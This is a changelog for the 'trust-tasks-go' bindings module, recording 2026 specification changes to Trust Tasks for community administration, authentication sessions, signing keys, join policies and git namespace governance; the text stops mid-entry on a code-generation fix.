# Changelog — `trust-tasks-go`

All notable changes to the Go bindings module.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
The module versions over **its own API** — what a consumer compiles against —
not over `SPEC.md`. Below 1.0 a breaking change bumps the leading non-zero
component.

A Go module is published by tagging, so the released version of this module is
the `trust-tasks-go/vX.Y.Z` tag rather than anything in the tree; the `Version`
constant in `trusttasks/version.go` mirrors it. See `RELEASING.md`.

## 0.5.4 — 2026-10-03


### Documentation

- **git-ns**: Single-administrator mode may waive the self-grant rule (#725)

Fixed rule 7 of git-ns/right/grant 0.3 named break-glass as the one way
  an actor records an elevated right for themselves. In a community run by
  one person there is nobody to make those grants or to ratify a
  break-glass, so the rule left its administrator unable to own what they
  create or adopt, or to reseat a namespace to themselves.

  Add a narrowly scoped exception in git-ns/right/grant 0.3 (new section
  "The single-administrator waiver"): a VTC its host operator has
  configured for single-administrator operation (a host-level setting
  outside community policy; VTI-APV-022 in the VTI specification) MAY
  waive rule 7 for one operation when no other party is eligible to make
  the grant. When it does it MUST require an operation-bound step-up,
  MUST record a highest-severity audit event before the record (refusing
  if it cannot), and MUST mark the record and the response (payload ext);
  the record counts toward the last-owner and last-admin invariants. With
  any other eligible party the rule applies unchanged.

  repo/create 0.3, namespace/reseat 0.3 and drift/resolve 0.3 refer to
  the waiver where they apply rule 7. Prose only, in place on draft specs
  (SPEC 5.2); no schema change, since every affected response already
  carries the open ext member.

## 0.5.3 — 2026-10-03


### Added

- **git-ns**: Bridge event 0.4 pullRequestOpened and job 0.5 closePullRequest (#723)

A VTC community can restrict who may open pull requests on its governed
  repositories. The bridge reports each pull request opened or reopened
  (git-ns/bridge/event 0.4, new pullRequestOpened variant); when the VTC's
  pull-request policy does not allow the author, it sends the bridge a
  closePullRequest job (git-ns/bridge/job 0.5), which posts the community's
  message as a comment and closes the pull request, idempotently.

  Owners, maintainers and the bridge are always allowed; a reopen by an
  owner or maintainer is an override. The gate is hygiene, not the merge
  gate: the required commit-trust check remains the security control.

  Regenerated Rust, TypeScript, Go and Dart bindings.

## 0.5.2 — 2026-10-03


### Added

- **vtc**: Live admin console events — a hint-only subscription (#721)

Adds vtc/admin/events/subscribe/0.1 and vtc/admin/events/event/0.1, and
  the HTTPS binding 0.3 that carries them.

  A console opens one live channel per session with a signed subscribe
  naming the topics it renders (actions, acknowledgements, joinRequests,
  members, singleAdminMode, config). The community answers with the
  #response as the first document on a stream, then sends event documents
  that are hints only: a topic, a time, a resume token, and for the badge
  topics the caller's count. A hint MUST NOT carry record data, record
  identifiers or personal data; the console re-fetches through the
  existing signed reads, so authorization stays on every read and the
  stream can neither leak a record nor grant a read. Each topic is sent
  only to a caller who could perform its read, checked per hint; a
  shrinking topic set ends the stream rather than silently narrowing it.
  Resumption is in-band (`since`), an unknown token is never an error,
  and the console must show live/offline from a signal that can go false
  (heartbeat interval in the response). Polling stays the fallback.

  HTTPS binding 0.2 said it defined no streaming variant, so 0.3 adds
  §2.1 streamed responses: Accept: text/event-stream on the ordinary
  POST; refusals stay JSON and never open a stream; the #response is the
  first SSE event; one complete document per single data: line, no
  event: field; SSE id carries the task's resume token; heartbeats are
  SSE comments; resumption is in-band only, with Last-Event-ID a
  cross-check (mismatch is malformedRequest); either side may close, a
  close is not cancellation, no error is sent after the #response, and a
  stream ends no later than the bearer credential that opened it. Native
  EventSource reconnection (a bodiless GET) is deliberately not offered:
  every (re)connection is a freshly signed request. Registered in
  website/assets/bindings.js. No framework change was needed.

## 0.5.1 — 2026-10-03


### Added

- **vtc**: Cooling-off actions, a reduction-pending notice and an offline-write record type (#719)

Three gaps the VTC implementation (OpenVTC/verifiable-trust-infrastructure#1920)
  found in the vtc/admin/actions family.

  vtc/admin/actions/_shared/0.2 adds the cooling-off action. A removal of an
  administrator with no third party to consent is parked for a cooling-off
  period and lands by itself unless its requester cancels. 0.1 could only say
  that by omitting threshold and expiresAt against its own prose and carrying
  the landing time in ext. 0.2 adds category coolingOff, landsAt (when it lands),
  cancellableBy (requester), closedReason landedAfterCoolingOff, and callerRole
  subject, so the administrator being removed can see the action. list, show,
  cancel and acknowledge 0.2 re-point at _shared 0.2; their request payloads
  and error codes are unchanged.

  vtc/members/authority-reduction-pending-notice/0.1 tells the subject that a
  reduction is cooling off, before it lands. The subject cannot block it,
  because a veto held by the subject would protect a compromised subject. One-way,
  proof REQUIRED.

  vtc/operator/offline-write/0.1 is a record type, never sent. An acknowledge
  action for an operator's offline write (vtc admin emergency-bootstrap and its
  siblings) names it as typeUri and carries the record as payload. Before, there
  was no Type URI to name, because those commands are not Trust Tasks.
  sideEffects none. It follows the registry's existing never-sent-on-its-own
  documents (auth/step-up/approver/attest, auth/signing-key/authorize).

## 0.5.0 — 2026-10-03


### Specifications

- **git-ns**: Activity/list 0.1 declares the `source` its ActivityItem requires (#718)

`$defs/ActivityItem` listed `source` in `required` but defined no `source`
  property, under `additionalProperties: false`. No item could validate, so no
  non-empty `git-ns/activity/list/0.1#response` could either: a consumer that
  validates rejected every conforming response. The `Source` enum (`audit` |
  `job`) was defined in `$defs` but never referenced. The spec prose, its
  examples and the one implementation (the VTC) all carry `source`; only the
  schema lost it. The property now references `#/$defs/Source`.

  The spec is a draft and the change makes the schema accept the wire its prose
  and implementation already use, so it is edited in place (SPEC §5.2).

  The registry's unsatisfiable-schema lint (added after
  `provision/integration/0.3`, #326) checked only the root and
  `$defs.Response`, so an item definition reached through `Response.items`
  went unseen. It now walks every subschema closed by
  `additionalProperties: false`; against main it reports exactly this defect
  and nothing else.

  Breaking for Rust: the generated `ActivityItem.source` was an untyped
  `serde_json::Value` (the codegen's fallback for a required member with no
  schema) and is now the generated `Source` enum. Go and Dart gain a typed
  `source` field; TypeScript gains it on the interface and the embedded schema.

  Reported by the VTA browser plugin's schema-satisfiability test against
  @openvtc/trust-tasks 0.22.7.

## 0.4.7 — 2026-10-02


### Added

- **vtc**: Administrator action list, approver-device step-up, and role-based authority (#714)

* feat(vtc): administrator action list, approver-device step-up, and role-based authority

  Wire shapes for role-based administration at a community, the N-of-M
  approval action list, and an approver device as a re-authentication factor.
  Requirements: trustoverip/dtgwg-vti-spec#51 (VTI-APV-016 - 021,
  VTI-ACL-035 - 037, VTI-VTC-022 - 023). Design:
  OpenVTC/verifiable-trust-infrastructure docs/05-design-notes/
  vtc-{action-list,approver-step-up,admin-roles}.md.

  Action list (new family vtc/admin/actions):
  - _shared/0.1 Action (category approval|acknowledge|queue, status, threshold,
    approvals, summary rendered from the digested payload via JSON Pointers,
    templateDigest, per-approver challenge).
  - list/0.1 (views waitingForMe|requestedByMe|history|all, counts for the
    console badge), show/0.1, cancel/0.1, acknowledge/0.1.
  - A parked operation is answered with the existing trust-task-next-step/0.1
    (continuation proceed, expects vtc/admin/actions/show/0.1).
  - task-consent/decision/0.2: optional evidence (webauthn | approverSigned)
    and actionId; the document proof stays the approver's own.

  Approver step-up (new family auth/step-up/approver):
  - attest/0.1, the approver's signed statement (purpose stepUp|decision|enrol),
    carried embedded.
  - invite/0.1, redeem/start/0.1, redeem/finish/0.1, enroll/0.1 (self-service
    from an existing factor, subject's own signature), list/0.1, revoke/0.1,
    _shared/0.1 Approver.
  - auth/step-up/approve-request/0.4 (accepts, approvers) and
    approve-response/0.6 (approverSigned evidence).
  - vtc/install/claim/{start,finish}/0.3: claim under an existing DID with an
    approver instead of a passkey.

  Roles and capabilities:
  - acl/_shared/0.2 AclEntry with explicit act, keys and capabilities
    (VTI-ACL-006 - 008, -020), optional approve and approveCapabilities,
    resource-qualified capability grants (VTI-ACL-035), delegatedBy.
  - acl/{grant,update,show,list,revoke,change-role}/0.2 on AclEntry 0.2.
  - New family vtc/roles: _shared/0.1 RoleDefinition (a role is a ceiling),
    define/0.1, list/0.1, show/0.1, delete/0.1.

  All four bindings regenerated (Rust, TS, Go, Dart); check-bindings agrees.

## 0.4.6 — 2026-10-02


### Added

- **auth/signing-key**: Enroll 0.2 — the identity's own authorization, and key replacement (#712)

auth/signing-key/enroll/0.2 adds two optional members to 0.1:

  - authorization: a complete auth/signing-key/authorize/0.1 document (new),
    issued and signed by identityDid, addressed to the consumer, whose payload
    is the enrolment's payload with authorization removed. A valid one is the
    authority evidence of control over identityDid in place of an
    operation-bound step-up. For a holder who signs in with a key its agent
    holds (a VTA wallet persona) and has no passkey at the consumer, it is the
    only evidence available, and it is the stronger of the two.
  - replaces: an active delegation of the same identity revoked in the same
    critical section as the enrolment. At the consumer's cap a holder whose
    other keys live on browsers it no longer has could neither list nor revoke
    them — both need a working key — and so could not enrol at all.

  tooManyKeys gains details.activeKeys, listed only once the enrolment's
  authority evidence has been accepted. New codes: authorizationInvalid,
  replaceNotFound (one answer for every reason). The cap is decided after the
  evidence and standing, counting a replaced key as gone. Producers SHOULD mint
  a new key per enrolment: an expired delegation still answers
  alreadyEnrolled.

  authorization is an open object in the enroll schema on purpose: its proof
  covers every member, so a binding must not narrow it to a typed struct that
  drops one before verification.

## 0.4.5 — 2026-10-02


### Added

- **vtc/join-requests**: A criterion states its admission, so any join policy is expressible (Keyring VTI-13) (#710)

* feat(vtc/join-requests): a criterion states its admission, so any join policy is expressible (Keyring VTI-13)

  A community's join criteria could not express its join policy. A criterion
  was a DCQL query (presentation-definition) with optional vetting, so it could
  not say:
  - that nothing is required: DCQL asks for at least one credential, so an
    open community had to delete every criterion;
  - that a submission meeting it is reviewed rather than admitted;
  - that an invitation is required, outside `vetting`;
  - whose credentials count.
  And submit decided against an unseen "active join policy", so an applicant
  could not tell an automatic path from a queue.

  A criterion is now one way into the community: what it requires and how a
  submission meeting it is decided.
  - vtc/_shared/0.2 schema-registry: AcceptsCriterion gains `admission`
    (REQUIRED: automatic | review), `credentialIssuers` (community | recognised
    | any, with `query`) and `invitationRequired`. `query` becomes OPTIONAL.
  - vtc/schemas/accepts/register, show, list 0.2: adopt it.
    register/0.2 adds `unsupportedRequirement`.
  - vtc/join-requests/manifest/0.3: `admission`, `credentialIssuers` and
    `invitationRequired` on Criterion; `presentationDefinition` OPTIONAL;
    `requirementsDigest` REQUIRED on every criterion. Criteria are listed in the
    order the community decides by. An empty list means no applications are
    accepted.
  - vtc/join-requests/submit/0.3: `criterion` names the criterion by digest. A
    submission naming none is decided under the first criterion it meets.
    Deciding is stated normatively. Not meeting a criterion never admits;
    `review` refers and never admits by itself; `automatic` admits unless the
    community refuses or refers on recorded grounds outside its criteria.
    Nothing outside a criterion admits anyone. New codes `criterionUnknown` and
    `notAccepting`.

  The specifications state no default criterion and prefer none. Open
  admission, review only (where invitations and trusted credentials admit no
  one), invitation only, credential-gated, vetted, and any combination or set
  of alternatives are expressed the same way, and each community's
  administrators choose. Earlier versions are unchanged.

  Bindings regenerated (Rust, TS, Go, Dart).



### Specifications

- **vtc/join-requests/status**: An approved applicant can ask for its credentials again (#709)

* spec(vtc/join-requests/status): an approved applicant can ask for its credentials again

  An approved join is not finished until the membership credential reaches the
  applicant, and nothing in the family could say it had not, or ask for it again.
  In the field a persona was approved, listed as a member, and stayed Pending in
  its client: the credential push was lost, and a poll answering `approved` sent
  nothing.

  status/0.1 (draft, in place):
  - request `resendCredentials`: ask for the already-issued credentials again.
  - response `credentialsDelivered` (on `approved`): whether the community holds
    the applicant's acknowledgement.
  - response `credentialResend` (`queued` | `notNeeded` | `rateLimited`) and
    `retryAfter`. Absent after the flag means the consumer does not support it.
  - A re-delivery MUST send what was issued and MUST NOT issue anew; it goes to
    the request's applicant only, and the consumer rate-limits it.
  - `sideEffects` moves from `none` to `mutating`, so the task declares
    `issuedAtRequirement: REQUIRED` and carries an `## Authorization` section:
    ownership of the request.

  All four bindings regenerated.

## 0.4.4 — 2026-10-01


### Added

- **vta/webvh/dids/create**: 1.1 states `serverless` in the response (#702)

* feat(vta/webvh/dids/create): 1.1 states `serverless` in the response

  A serverless DID exists only in the VTA until the caller serves its first log
  entry. In 1.0 the response says so only by leaving out `serverId`. A client
  that missed the absence went on to resolve a DID nobody serves, and failed later
  with an error naming the DID rather than the cause (Keyring VTI-20: a persona
  minted on a VTA with no hosting server registered got through whoami, contexts,
  mint and key borrow before failing).

  1.1's response REQUIRES `serverless`. It is true exactly when the request named
  no `serverId`, and then the response carries `logEntry` and no `serverId`. A
  producer reads it rather than inferring it. 1.1 is a new version rather than an
  edit to 1.0 because 1.0's response refuses unknown members; both stay draft
  (SPEC §5.2 permits the required member as a MINOR at draft). The request schema
  is unchanged.

  Bindings regenerated (Rust, TS, Go, Dart).

## 0.4.3 — 2026-10-01


### Specifications

- **vtc/members**: Step-up passkey notice tells a member who enrolled or revoked one for them (#700)

Models vtc/members/step-up-passkey-notice/0.1 on git-ns/right/break-glass-notice: a
  one-way, unsolicited notice with no reply. Covers auth/passkey/enroll/invite and
  auth/passkey/revoke/finish acting on a member's stepUp credential, naming the
  event, the credential id, who acted, and when, with an optional admin reason -
  so an administrator (or an attacker using that standing) enrolling or revoking a
  step-up passkey for a member is never silent.

## 0.4.2 — 2026-10-01


### Specifications

- **vtc/endorsements**: Community identity checks are vetted/1 statements (#697)

Reverse the reserved IdentityVerificationCredential design of #695. The
  registry's vetted/1 (trustoverip/dtgwg-vsc-registry#24) now admits the
  community itself as issuer, so a community records its own identity checks as
  a vetted/1 statement rather than minting a separate credential type. All
  affected specs are `draft` and change in place.

## 0.4.1 — 2026-09-30


### Specifications

- **vtc/endorsements**: IDVC issuance and reserved type values, matching VTI (#695)

Describe what the implementation (OpenVTC/verifiable-trust-infrastructure#1859)
  does. All affected specs are `draft` and change in place.

## 0.4.0 — 2026-09-30


### Specifications

- Conform vetting, member and endorsement credentials to DTG VSC/VAC and the predicate registry (#691)

* spec(vetting)!: conform vetting credentials to DTG VSC/VAC and the predicate registry

  The credentials the vetting family defines now follow the latest DTG
  Credentials Core Specification and the DTG VSC predicate registry. All
  affected specifications are `draft`, so they change in place (SPEC §5.2).

  Vetting Statement (vetting/session, vtc/vetting/revoke-statement): no longer
  an `EndorsementCredential`. It is a Verifiable Statement Credential —
  `type` [VerifiableCredential, DTGCredential, StatementCredential], `@context`
  [credentials/v2, https://registry.trustoverip.org/dtg/context/v1],
  `issuerScope` directed or public, `taskContext` and `taskDigestMultibase`
  both REQUIRED — with `credentialSubject.predicate`
  https://registry.trustoverip.org/dtg/vsc/vetted/1 and the vetting body in
  `credentialSubject.object.value`. The body's `type` member is gone; the
  predicate carries the meaning. The example's statement digest is recomputed.

## 0.3.16 — 2026-09-30


### Added

- **specs**: Trust Tasks for the remaining VTA/VTC REST-only surfaces (#692)

Three REST operations had no Trust Task spec: vta/metrics/show/0.1 (the
  VTA's Prometheus-shaped metrics, admin-only, reusing did-management's
  shared MetricsSnapshot shape), vta/attestation/mnemonic-status/0.1 (the
  super-admin check of the one-time mnemonic export window), and
  vtc/vetting/hidden/publish/0.1 (turning on, or rotating, hidden-vetter
  admission for a criterion).

  auth/sign-out, community/branding, community/requested-attributes,
  vetting/vetters (list), vetting/auto-grant and vetting/revocations
  already have specs matching their REST routes; no gap there.

  Regenerated Rust, TypeScript, Go and Dart bindings.

## 0.3.15 — 2026-09-29


### Added

- **vtc**: Pairwise revoke authorization and admin-resend for vetters (#689)

vtc-service kept two REST-only doors because no Trust Task spec expressed
  them: relationships/revoke's DELETE route accepts a VrcRevokeAuthorization
  proving control of a pairwise relationship DID, and vetting/vetters/resend
  kept an admin route for resending another member's grant.

  - vtc/relationships/revoke/0.2 adds an optional pop, a proof of possession
    by the relationship's issuerDid bound to this document and to the edge,
    mirroring vtc/relationships/publish/0.2's pop. 0.1 is unchanged and not
    retired.
  - vtc/vetting/vetters/resend/0.2 adds an optional memberDid so an
    administrator can resend a named member's live grant, requiring the
    community-administrator capability. 0.1 is unchanged and not retired.

  vtc/endorsements/{list,show,revoke} already exist and already match their
  REST routes; no gap there.

  Regenerated Rust, TypeScript, Go and Dart bindings.

## 0.3.14 — 2026-09-29


### Added

- **git-ns**: Administrator reads as Trust Tasks (#686)

* feat(git-ns): administrator reads as Trust Tasks

  Six VTC git-ns console REST reads had no Trust Task equivalent: the admin
  console's Repos plugin (rights, jobs, projection, accounts) and activity
  feed were served only over a bearer admin session, with no signed,
  transport-agnostic path.

  New specs:

  - git-ns/right/list/0.1 — the whole-community rights picture (recorded and
    v0.1 role-derived grants), each row's subjectMember/granterDeparted.
    A new spec rather than a git-ns/view revision: the role-derived rows are
    not RightRecords (no granter, no grant time) and the administrative
    membership facts are not member-facing, so folding them into view/0.5's
    shared RightRecord would widen every other consumer of that component.
  - git-ns/right/issued-by-departed/0.1 — recorded rights grouped by a
    departed granter, alongside the community's cascade_on_departure policy.
  - git-ns/bridge/job/list/0.1 — the bridge job queue, scoped to administered
    namespaces like git-ns/namespace/list and git-ns/repo/list.
  - git-ns/projection/show/0.1 — what is published to the Trust Registry,
    and how many records the next reconciliation pass will change.
  - git-ns/account/list/0.1 — every member's linked forge account,
    community-wide, since git-ns/view only returns the caller's own.
  - git-ns/activity/list/0.1 — rights changes, drift and bridge jobs
    interleaved into one timeline, scoped like the namespace/repo listings.

  All six declare proof REQUIRED, an Authorization section naming either the
  community-administrator capability (rights, issued-by-departed,
  projection, accounts — matching the REST handlers' SuperAdminAuth gate) or
  namespace-administrator standing (jobs, activity — matching the namespace
  and repo listings' pattern), and a cursor/limit paged list shape.
  git-ns/_shared/0.5 adds AdminRightRow and RightOrigin, the row shape right/list
  and right/issued-by-departed share.

  Regenerated all four bindings (Rust, TypeScript, Go, Dart).

- **auth**: Proxied authenticate and session-key refresh (#687)

## Summary

  webvh#238 kept three REST auth routes because no Trust Task covered them: the VTA-proxied SIOPv2 login (`POST /api/auth/challenge` + `POST /api/auth/`) and the session-key-bound refresh (`POST /api/auth/refresh`). This PR closes both gaps so webvh can delete its last REST auth routes.

  - **`auth/authenticate/0.3`** — adds an optional proxied form. `payload.principal` names the VID being authenticated as when it differs from the document's `issuer`; `payload.delegationEvidence` carries whatever the auth service's own policy requires as evidence that `issuer` (the delegate, e.g. a holder's VTA) may act for `principal`. The resulting `Session.subject` is `principal`; the new `Session.actor` (shared `_shared/0.3` Session schema) records the delegate, so audit and revocation never conflate the two. The ordinary (self-authenticating) form from 0.2 is unchanged, including the `sessionKey` binding.
  - **`auth/refresh/0.2`** — accepts a `proof` made by the session key bound at login (`auth/authenticate/0.2`/`0.3`), required in addition to the refresh token whenever the located session carries one (`sessionKeyProofRequired` otherwise). Adds an absolute session lifetime rule: refresh MUST NOT advance `Session.expiresAt` past `Session.absoluteExpiresAt`, refusing with `sessionLifetimeExceeded` once reached — the session key is never accepted as approval/step-up authority, only as a binding check layered on the bearer token.

  Both specs add an `## Authorization` section (framework 0.6.0, required for consequential tasks), the four Security & Privacy sub-headings covering delegation abuse, stolen session keys and refresh-token theft with valid/invalid examples, and `## Changes from` sections.

  All four bindings (Rust, TypeScript, Go, Dart) regenerated and cross-checked.

  ## Test plan

  - [x] `npm run validate`
  - [x] `npm run check-bindings`
  - [x] `cargo test -p trust-tasks-rs -- specs::auth` (81 passed)
  - [x] `cargo test -p trust-tasks-rs --features validate -- specs::auth::authenticate::v0_3 specs::auth::refresh::v0_2` (8 passed, including `rejects_invalid_examples`)

## 0.3.13 — 2026-09-28


### Added

- **vta/contexts/update-did**: 1.1 — clear a context's DID with did: null (#684)

* feat(vta/contexts/update-did): 1.1 — clear a context's DID with did: null

  1.0 required a non-empty `did`, and `vta/contexts/update` only ever sets
  one, so once a context had a DID it could be replaced but never removed.
  The VTA refuses to delete a DID a context acts as and tells the operator
  to reassign it — which left no way to retire a context's last DID short
  of assigning one they did not want.

  1.1 makes `did` nullable: `null` leaves the context with no DID, the
  same state as one created without, and the record comes back with `did`
  absent. A string `did` must now match the DID Core §3.1 grammar; 1.0's
  `minLength: 1` accepted "did:" and "hello" as identities. Both are
  permitted as a MINOR bump on a draft spec (SPEC §5.2), and a 1.1
  consumer must still accept 1.0.

## 0.3.12 — 2026-09-28


### Added

- **vtc/website**: Website content moves as a chunked Trust Task transfer (#682)

Replaces the raw-byte REST routes (GET/PUT /website/files/{path}, POST /website/deploy) with Trust Tasks, modelled on backup/* and reusing vta/_shared/0.1/backup-transfer's chunk vocabulary:

  - vtc/website/upload/begin — commits the target (a file at a path, with optional ifMatch, or a whole-site bundle), total size, whole-content SHA-256 and every chunk digest before any byte moves.
  - vtc/website/upload/chunk — one chunk of up to 256 KiB, checked against the manifest on arrival; idempotent.
  - vtc/website/upload/commit — reassembles and verifies the SHA-256; writes a file target atomically, or stages a bundle.
  - vtc/website/upload/abort — discards an open or staged upload.
  - vtc/website/deploy — publishes a staged bundle (live replace, or a new managed generation with pruning).
  - vtc/website/files/show — ranged reads of up to 256 KiB with the whole-file etag.

  begin, chunk and files/show declare maxDocumentBytes (256 KiB, 352 KiB, 352 KiB response), so the community's 64 KiB default is not raised for every other task. Shared component vtc/_shared/0.1/website-transfer. Bindings regenerated for Rust, TypeScript, Go and Dart.

- **vtc**: Trust Tasks for the community's REST-only admin surfaces (#680)

* feat(vtc): Trust Tasks for the community's REST-only admin surfaces

  Specifies, at 0.1, the VTC operations that existed only as REST routes, so each can be served as a sender-bound signed Trust Task over TSP, DIDComm or HTTPS:

  - auth/signing-key/{enroll,list,revoke} — delegated signing keys (the admin console's non-extractable browser key). Enrolment is signed by the key being enrolled (proof of possession) and names the identity it acts for; control of that identity is established by separate authority evidence, which the reference implementation takes as an operation-bound passkey step-up.
  - vtc/community/{branding,requested-attributes,join-discovery}/{show,update}
  - vtc/schemas/{register,list,show,delete} and vtc/schemas/accepts/{register,list,show,delete} — register and show declare maxDocumentBytes, since a credential schema exceeds the 64 KiB default.
  - vtc/vetting/vetters/grants/list, vtc/vetting/auto-grant/{show,update}, vtc/vetting/revocations/list
  - vtc/relationships/{suspend,restore} — the edge issuer's own proof replaces the REST pop authorization.
  - vtc/join-requests/vetting/show, and vtc/join-requests/query — its own task rather than credential-exchange/*, because an administrator instructs the verifier, which alone can author the query's challenge.
  - vtc/rooms/list — under vtc/, not rooms/, because it is authorized by host ACL and rooms invariant I5 forbids that for any rooms/* task.

  Shared components: auth/_shared/0.1/signing-key and vtc/_shared/0.1/{community-presentation,schema-registry,vetting-auto-grant,relationship-lifecycle}. Relationship persona attach/detach stays out, blocked on dtgwg-cred-spec#9. Bindings regenerated for Rust, TypeScript, Go and Dart.

- **spec-meta**: A specification declares its own maximum document size (#679)

Adds an optional front-matter member, maxDocumentBytes { request?, response?, rationale }, stating the largest serialized Trust Task document (proof included, transport envelope excluded) of each variant that a consumer serving the task must not refuse on grounds of size alone, and should refuse beyond with malformedRequest.

  SPEC §12.4 already tells a consumer to bound what it parses at "a body-size limit appropriate to the Trust Task specification's payload", and §7.3 item 19 notes that a transport-layer limit is the wrong place to pick the number; until now no specification could say what it was. A consumer serving many tasks therefore applied one blanket cap sized for the small ones, and a task that legitimately carries a JSON Schema or a chunk of a file was refused. This lets the bound be stated, and enforced, per type.

  - specs/spec.meta.schema.json: the member (at least one variant, 1 KiB to 16 MiB; larger content belongs in a chunked transfer).
  - trust-tasks-codegen: reads it and emits Payload::MAX_DOCUMENT_BYTES on the request and response impls, plus schema_index::max_document_bytes_for(type_uri) for a dispatcher that learns the type before parsing. An absent variant never inherits the other's bound.
  - trust-tasks-rs: the trait constant, defaulting to None.
  - check-bindings: holds Rust's constants to the front matter, re-derived independently.
  - CONTRIBUTING-SPECS: when and how to declare it.

  Rust only for now, like ERROR_CODES; the TypeScript, Go and Dart generators do not emit it yet. The framework text (a §7.3 item) is proposed in the canonical specification repository; this is the registry's half.



### Specifications

- **webvh/witness/sign**: Let a witness sign the entry that deactivates a DID (#681)

## 0.3.11 — 2026-09-28


### Added

- **trust-task-discovery**: Publish 0.3, a responder advertises its acceptance window (#677)

A consumer refuses a document whose issuedAt lies outside its acceptance
  window (SPEC §7.2 item 13), and the framework leaves that window to the
  consumer's policy. A producer that holds a document before delivering it
  (store-and-forward, retry, escalation, a queue replayed after a restart)
  cannot tell a document the consumer will still accept from one it will
  refuse as expired. So it cannot tell when to issue a new attempt (SPEC
  §8.4) instead. The only alternative is a constant both ends share.

  - specs/trust-task-discovery/0.3: the response gains an optional
    acceptanceWindow { maxAgeSeconds, clockSkewSeconds }, in whole seconds.
    It appears at the response level, and on an expanded supportedTypes
    entry, where the entry's value takes precedence.
    - Responder: MUST NOT state a window wider than it applies, and is not
      bound by what it advertised.
    - Discoverer: authenticated responses only. SHOULD NOT send after
      issuedAt + maxAge, and MUST NOT after issuedAt + maxAge + skew. It
      issues a new attempt instead (fresh id and issuedAt, same thread,
      new proof), and never re-stamps under the original id (idConflict).
      It does not issue a new attempt of a consequential task unless a
      repeat is harmless or recognizable. It never backdates to fit a
      window, bounds its new attempts, and treats a refusal as the answer.
    - Absent: the discoverer has learnt nothing. It falls back to the
      window the task's specification states (item 17) or its own, with
      the typical skew tolerance of at most 60 s. Absence is never read as
      "no window".
    - The response is closed, so a 0.2 discoverer that validates would
      reject the member. §5.2 makes an added optional member a MINOR
      increment, hence 0.3 rather than an edit to 0.2.
    - Response-side invalid examples: a missing member, a zero max age,
      negative skew, fractional or string values, an unknown member, and
      a malformed entry-level window.
  - trust-tasks-codegen: a payload.invalid-examples.json fixture may carry
    "variant": "response". It is checked against Response and its
    sub-schema by a separate rejects_invalid_response_examples test. It is
    refused in a spec with no response. Existing fixtures, and every other
    generated module, are unchanged.
  - CONTRIBUTING-SPECS.md documents the variant.
  - Bindings regenerated (Rust, TS, Go, Dart).

  The framework text (SPEC §10) still names 0.2 as the current version.
  That is a change to the canonical repository and follows separately.

  Proposed from OpenVTC/verifiable-trust-infrastructure#1799, where both
  ends currently share a constant window.

## 0.3.10 — 2026-09-28


### Added

- **auth**: Authenticate 0.2 binds a session key to the session (#675)

A wallet login signs the auth/challenge/auth/authenticate exchange with the
  subject's own key, which today means one wallet prompt per console call for
  the lifetime of the session -- there is no equivalent of the passkey login
  path's browser-bound key. This adds an optional payload.sessionKey (a
  did:key VID) to auth/authenticate: the producer generates it fresh per
  login, ideally as a non-extractable key, and the consumer binds it to the
  session it creates. Once bound, a proof by that key stands in for the
  subject for that session only -- bounded by the session's expiry and acr,
  and never accepted where a spec requires an assertionMethod attestation
  (auth/step-up/approve-response, task-consent/decision, confirm/response).
  Consumers that don't support the requested key type MAY refuse with the new
  auth/authenticate:sessionKeyUnsupported code.

  The shared Session shape gains the same optional sessionKey member, as a new
  _shared/0.2 component version (auth/whoami and auth/sessions/list still pin
  0.1 and would need their own version bump to surface it -- out of scope
  here). wireCompatibleWith was considered and not declared: 0.2 is a strict,
  non-identical superset of 0.1's wire shape, not the wire-identical case that
  field is for.

  Regenerated all four bindings (Rust, TS, Go, Dart) and confirmed
  check-bindings agrees across all of them.

## 0.3.9 — 2026-09-27


### Added

- **vta/services**: Rollback 1.1 with a mediator drain window (#670)

`vta/services/rollback/1.1` adds an optional `drainTtlSecs`, the member
  update 1.1 added in #656, with the same rules. A rollback of a mediated
  transport (`didcomm`, `tsp`) can move it off its current mediator, which then
  drains; 1.0 gave the operator no say in how long, so the agent could only apply
  its default. The VTA's CLI (`services didcomm rollback --drain-ttl`) and SDK
  carry an operator-chosen window that rollback 1.0 cannot express, so a rollback
  landing on a drain transition silently took the default.

  - Refused (`malformedRequest`) for `rest` and `webauthn`.
  - Absent takes the agent's default; a value below the floor may be raised to
    it, and must be over a request carried by the mediator being replaced.
  - One mediator carrying both mediated transports drains once, reported by a
    single `drainUntil`.
  - Accepted with no effect when the rollback leaves no mediator draining, since
    whether it drains depends on stored state the operator may not have in view.

  A 1.0 request is a valid 1.1 request; the response is unchanged (the shared
  `RollbackResult` already carries `drainingMediator` and `drainUntil`).

  Rust, TypeScript, Go and Dart bindings regenerated.



### Documentation

- **specs**: Operational examples sign for authentication (#669)

VTI-KEY-022 (#637) moved a Trust Task document's proof default to
  proofPurpose: authentication, reserving assertionMethod for the closed
  list of attestations and approver decisions (auth/step-up/approve-response,
  task-consent/decision, confirm/response). #637's own sweep updated the
  top-level examples that existed at the time; this catches the git-ns
  minor versions published after that sweep, plus acl/swap-key,
  did-management/did/publish and SPEC.md's own examples, which still
  showed assertionMethod on an operational document's proof.

  Left unchanged: real attestations (task-consent/decision,
  auth/step-up/approve-response, confirm/response), embedded
  credentials and signed artefacts (vetting cards, witness proofs, the
  vault/credentials responses, the role credential in
  vtc/vetting/vetters/grant), DID-document verification-relationship
  references, the generic keys/derive-and-sign-document signing service,
  vault/sign-trust-task (PR #667 is open against it), and the
  provision/integration invalid-examples fixtures that already
  demonstrate this rule.

  Regenerated all four bindings; only Rust had a diff, since its codegen
  embeds each spec's fenced examples as conformance tests.

## 0.3.8 — 2026-09-27


### Specifications

- **vault/sign-trust-task**: The proof purpose follows the document type (#667)

* spec(vault/sign-trust-task): the proof purpose follows the document type

  An operational document is signed for authentication; assertionMethod only
  for types whose specification defines them as the issuer's attestation
  (approve-response, task-consent/decision, confirm/response). The maintainer
  decides it from type, never the consumer. Aligns 0.1 and 0.2 with the
  framework's proof-purpose rule.

## 0.3.7 — 2026-09-27


### Fixed

- **codegen**: Generate usable types for oneOf branches that use not (#665)

typify (0.6) merges a `oneOf` branch's own keywords into the untagged
  enum variant it synthesizes for that branch. A bare `not: {"required":
  ["x"]}` is a shape it handles directly — property `x` is simply absent
  from that variant. Wrap the same exclusion in `anyOf` (the shape a
  3-way mutual-exclusion group needs, e.g.
  auth/passkey/enroll/invite/update/0.1's role/expiresAt/extendBy) and
  typify's merge instead produces an uninhabited `pub enum
  PayloadVariant0 {}` for that branch, so a payload carrying only `role`
  (plus `inviteId`) could never deserialize — and silently drops a
  property required only by that branch from every *other* branch's
  variant too, so `role` + `expiresAt` together also failed to
